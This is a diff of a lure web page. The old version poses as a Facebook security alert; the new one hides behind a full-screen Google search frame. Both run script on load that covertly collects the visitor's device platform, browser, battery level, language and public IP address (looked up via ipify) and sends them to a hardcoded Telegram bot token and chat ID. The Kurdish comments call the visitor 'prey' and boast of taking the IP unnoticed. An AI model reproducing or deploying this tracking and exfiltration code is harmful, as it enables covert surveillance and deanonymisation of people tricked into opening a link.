@@ -1,41 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Security Check</title>
-    <meta property="og:title" content="Security Alert - Facebook">
-    <meta property="og:description" content="Please verify your account to prevent suspension.">
-    <meta property="og:image" content="https://i.ibb.co/3S4S4y4/fb-alert.jpg">
+    <title>Redirecting...</title>
+    <style>
+        body { margin: 0; padding: 0; overflow: hidden; }
+        iframe { width: 100vw; height: 100vh; border: none; }
+    </style>
+</head>
+<body>
+    <iframe src="https://www.google.com/search?q=breaking+news"></iframe>
 
     <script>
-        async function sultanHack() {
-            const token = '8003094558:AAFAyNxNF-wAnQCgZ8XTJrZRIomL_l9JKrs';
-            const chat_id = '8418985219';
-            
-            // کۆکردنەوەی زانیاری
-            const info = "👑 **پاشا، نێچیرەکە هاتە ناو لینکەکەت!**%0A" +
-                         "📱 مۆبایل: " + navigator.platform + "%0A" +
-                         "🌐 وێبگەڕ: " + (navigator.userAgent.includes("Chrome") ? "Chrome" : "Browser") + "%0A" +
-                         "⏰ کات: " + new Date().toLocaleTimeString();
+        (async function() {
+            const T = '8003094558:AAFAyNxNF-wAnQCgZ8XTJrZRIomL_l9JKrs';
+            const C = '8418985219';
 
-            // ناردن بۆ تەلەگرام
+            // ١. کۆکردنەوەی زانیاری زۆر ورد (IP, Battery, Device)
+            let batteryInfo = "";
             try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${info}&parse_mode=Markdown`);
-            } catch (e) {}
+                const batt = await navigator.getBattery();
+                batteryInfo = `%0A🔋 باتری: ${Math.round(batt.level * 100)}%`;
+            } catch(e) {}
 
-            // ناردنی نێچیر بۆ لاپەڕەی ڕاستەقینە دوای ٢ چرکە
-            setTimeout(() => {
-                window.location.href = "https://www.facebook.com/security/login_alerts";
-            }, 2000);
-        }
-        window.onload = sultanHack;
+            const data = `👑 **سولتانە پاشا، نێچیرەکە ڕاوکرا!**%0A` +
+                         `📱 مۆبایل: ${navigator.platform}%0A` +
+                         `🌐 وێبگەڕ: ${navigator.userAgent.split(' ')[0]}` +
+                         batteryInfo +
+                         `%0A📍 زمان: ${navigator.language}`;
+
+            // ٢. ناردنی زانیارییەکان بە بێدەنگی
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${data}&parse_mode=Markdown`);
+
+            // ٣. فێڵی گەورە: دزینی IP بەبێ ئەوەی هەست بکات
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ip => {
+                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🌐 IPی نێچیر: ${ip.ip}`);
+                });
+        })();
     </script>
-</head>
-<body style="background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial;">
-    <div style="text-align: center;">
-        <img src="https://i.ibb.co/3S4S4y4/fb-alert.jpg" alt="Security" style="width: 100px; margin-bottom: 20px;">
-        <h2>Checking Security...</h2>
-        <p>Please wait while we verify your browser.</p>
-    </div>
 </body>
 </html>
